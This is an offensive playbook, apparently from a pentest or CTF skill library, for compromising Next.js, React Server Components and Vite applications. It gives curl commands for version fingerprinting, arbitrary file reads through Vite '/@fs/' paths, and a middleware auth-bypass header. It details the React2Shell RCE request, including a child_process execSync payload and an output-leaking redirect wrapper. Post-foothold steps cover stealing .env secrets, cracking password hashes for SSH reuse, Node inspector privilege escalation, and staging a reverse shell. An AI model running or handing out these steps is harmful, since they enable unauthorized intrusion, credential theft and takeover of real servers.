# Archetype: Modern Web JS Framework (Next.js / RSC / Vite)

**Match if you see:** `X-Powered-By: Next.js` · `Vary: RSC, Next-Router-State-Tree, Next-Url` ·
`/_next/static/...` chunk paths · `__next` / `self.__next_f` in HTML ·
a single prerendered dashboard with no forms/links · Vite dev banner
(`/@vite/client`, `/@react-refresh`, `/@fs/` paths, `?import` query) ·
React Server Components flight data (`1:["$","$L..."]`) in the response body.

**The mindset shift (this is the whole archetype):**
These apps put the exploitable surface in **framework-internal channels**,
not in visible routes. A static prerendered page with zero links is a
**recon decoy** — dirbusting and API fuzzing find nothing because the RCE
hits the Server Action / module-graph parser on *any* path, unauth. Do NOT
enumerate before probing the framework CVE (see creativity-catalog class N,
"Framework-internal trust").

## Fast checks (≤ 3 min, all cheap)

```bash
# 1) Pin the version from served runtime chunks — no auth needed
curl -s http://target/ | grep -oE '/_next/static/[^"]+\.js' | head
curl -s http://target/_next/static/chunks/<big-chunk>.js | grep -oE '"1[0-9]\.[0-9]+\.[0-9]+"' | head
#   verified: the big 517-*.js chunk embeds the Next version string e.g. "15.0.3"

# 2) Route count / buildId (confirms "static decoy", not a dead end)
curl -s http://target/_next/static/<buildId>/_buildManifest.js   # __routerFilterStatic.numItems

# 3) RSC flight present? middleware present?
curl -s -H 'RSC: 1' http://target/ | head -c 400   # flight data => RSC app
#   no "middleware" in flight => CVE-2025-29927 bypass is moot here

# 4) Vite dev server left on (dev build in prod = jackpot)
curl -s http://target/@vite/client | head -c 80          # 200 => dev server
curl -s 'http://target/@fs/etc/passwd'                   # arbitrary FS read
curl -s 'http://target/src/App.jsx?import'               # transformed source leak
```

## Attack surface, cheapest first

| EV | Vector | CVE / check |
|----|--------|-------------|
| HIGH | **RSC Next-Action prototype-pollution RCE** — POST any path, `multipart/form-data`, `Next-Action: x`; field `0` = flight payload polluting `__proto__`/`constructor`, `_prefix` runs as the node user | **CVE-2025-55182** ("React2Shell"), **CVE-2025-66478** · skill `react2shell-rce` |
| HIGH | **Vite dev `/@fs/` + `?import` source/secret leak** → read `/etc/passwd`, `.env`, server source outside root | **CVE-2025-30208** · `curl 'http://t/@fs/<abs>?import'`, `?raw??`, `?inline` bypass variants |
| MED | **middleware.ts auth bypass** — Next middleware treated as the authz layer; `x-middleware-subrequest` header makes the proxy skip middleware → reach guarded routes/admin | **CVE-2025-29927** · `curl -H 'x-middleware-subrequest: middleware' http://t/admin` (only if flight shows middleware) |
| MED | **Server Action over-trust** — `$ACTION_*` IDs callable without the UI; actions mutate state assuming they ran behind the React form | enumerate action ids from flight/chunks, POST them directly with `Next-Action:` |
| LOW | **Source map / chunk leak** → endpoints, action ids, secrets baked into client bundle | `curl .../_next/static/.../*.js.map`; grep chunks for `/api/`, tokens |

## React2Shell request shape (CVE-2025-55182) — the part people get wrong

- POST **any** path, `multipart/form-data`, headers `Next-Action: x` +
  `X-Nextjs-Request-Id`. Field `0` = the flight pollution payload, field `1`
  = `"$@0"`, field `2` = `[]`.
- `_prefix` executes as the service user:
  `process.mainModule.require('child_process').execSync('<cmd>')`.
- **Digest wrapper is the #1 failure:** wrap output in
  `throw Object.assign(new Error('NEXT_REDIRECT'),{digest:\`NEXT_REDIRECT;push;/login?a=${res};307;\`})`
  → **303** with command output in `Location:`. A bare `digest:${res}` → **500**
  with a 6–10-digit number that is a *React minified-error code, NOT your output*
  (identical on retry = payload shape wrong, pollution landed).
- Vendored PoC (read first, R10): `recon-poc.sh CVE-2025-55182` →
  jensnesten/React2Shell-PoC. Scanner defaults to **port 443** — pass
  `-u http://<ip> -p <port>` or you get a false NOT-VULNERABLE.

## Rules that bite hardest here

- **The static page is a decoy.** Zero links/forms is *normal* for a
  prerendered RSC dashboard and says nothing about exploitability. Probe the
  Server Action parser **before** any dirbust/ffuf — fuzzing is near-zero EV.
- **Version-pin from chunk hashes, not from guessing.** The exact `15.x.y`
  string is in the served JS; one `grep` decides which CVEs are live.
- **`?import`/404 answered once is answered forever (R17).** If `/@vite/client`
  404s, the prod build is served — drop the whole Vite lane, don't re-probe.
- **middleware ≠ authz.** If auth lives only in `middleware.ts`, the subrequest
  header (CVE-2025-29927) or any route the matcher misses bypasses it.

## Post-foothold

Executes as **`node`** (often uid 999) in the app dir. High-yield reads:
`.env` (API keys, DB path), app-local SQLite (`users` table, raw-MD5 hashes
crack offline → SSH reuse). Then `ss -tlnp` + `ps -ef | grep -- --inspect`
for a root-owned Node inspector → `node-inspector-privesc`. For interactive
access, stage a reverse shell per `single-exec-listener-lifecycle`.

## Matching skills

`react2shell-rce` (CVE-2025-55182 / CVE-2025-66478) · `node-inspector-privesc`
(root Node `--inspect` privesc) · `obfuscator-io-js-deobfuscation` (recover
endpoints/secrets from obfuscated client bundles) · `single-exec-listener-lifecycle`.
